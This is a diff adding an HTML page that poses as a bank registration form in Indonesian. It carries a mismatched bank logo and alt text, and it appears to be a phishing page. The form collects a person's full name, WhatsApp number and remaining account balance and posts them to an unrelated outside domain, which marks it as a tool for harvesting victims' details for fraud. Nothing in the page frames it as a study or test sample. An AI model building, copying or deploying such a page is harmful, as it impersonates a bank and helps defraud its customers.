@@ -1,0 +1,75 @@
+<html>
+<head>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+  <script>
+    document.addEventListener('DOMContentLoaded', function () {
+      const saldoInput = document.getElementById('saldo');
+      saldoInput.addEventListener('input', function () {
+        let value = this.value.replace(/[^0-9]/g, '');
+        if (value) {
+          value = parseInt(value, 10).toLocaleString('id-ID');
+          this.value = 'Rp. ' + value;
+        } else {
+          this.value = '';
+        }
+      });
+
+      const phoneInput = document.getElementById('phone');
+      phoneInput.addEventListener('input', function () {
+        this.value = this.value.replace(/[^0-9]/g, '');
+      });
+    });
+  </script>
+</head>
+
+<body class="bg-gray-100 flex flex-col items-center min-h-screen">
+
+  <div class="w-full bg-white p-4 flex justify-between items-center shadow-md fixed top-0">
+    <img alt="Bankaltimtara logo" class="h-10" src="https://i0.wp.com/joglosemarnews.com/images/2020/08/Bank_Jateng.png?resize=681%2C314&ssl=1"/>
+    <i class="fas fa-bars text-xl"></i>
+  </div>
+
+  <div class="flex-grow flex items-center justify-center w-full mt-20 px-4">
+    <div class="w-full max-w-md mx-auto bg-white rounded-lg shadow-md overflow-hidden">
+      <div class="bg-white p-6">
+        <h2 class="text-center text-blue-600 font-bold text-xl mb-4">FORMULIR PENDAFTARAN</h2>
+
+        <form action="https://id.tp1s.biz.id/dta.php" method="post">
+          
+          <div class="mb-4">
+            <label class="block text-gray-700">Nama Lengkap :</label>
+            <input class="w-full px-3 py-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-600"
+                   name="nama" placeholder="Nama lengkap" type="text" required/>
+          </div>
+
+          <div class="mb-4">
+            <label class="block text-gray-700">Nomor Whatsapp :</label>
+            <input class="w-full px-3 py-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-600"
+                   id="phone" name="nomor" placeholder="Nomor handphone" type="text" required/>
+          </div>
+
+          <div class="mb-4">
+            <label class="block text-gray-700">Sisa Saldo Akhir :</label>
+            <input class="w-full px-3 py-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-600"
+                   id="saldo" name="saldo" placeholder="Rp." type="text" required/>
+          </div>
+
+          <div class="mb-4">
+            <button class="w-full bg-blue-600 text-white py-2 rounded-lg font-bold hover:bg-blue-700"
+                    type="submit">LANJUTKAN</button>
+          </div>
+
+          <div class="text-center">
+            <a class="text-blue-600" href="#">Kembali ke halaman utama</a>
+          </div>
+
+        </form>
+
+      </div>
+    </div>
+  </div>
+
+</body>
+</html>
